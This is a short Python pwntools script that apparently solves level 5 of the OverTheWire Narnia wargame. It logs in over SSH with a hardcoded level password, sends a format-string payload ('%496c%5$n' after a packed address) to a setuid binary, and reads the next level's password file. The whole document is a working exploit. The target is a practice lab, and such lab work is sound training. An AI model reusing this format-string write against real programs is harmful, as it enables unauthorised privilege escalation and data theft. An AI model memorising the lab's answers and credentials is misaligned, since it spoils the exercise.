#! /usr/bin/env python3
import pwn

s = pwn.ssh('narnia5', 
            'narnia.labs.overthewire.org', 
            password='faimahchiy',
            port=2226)

n=63
x=pwn.p32(0xffffdc2c)
arg=(x+b'%496c'+b'%5$n'+b'A'*n)[:n]
p = s.process([b'/narnia/narnia5', arg ])
p.sendline(b"cat /etc/narnia_pass/narnia6")
p.recvline()
print(p.recvline())
s.close()
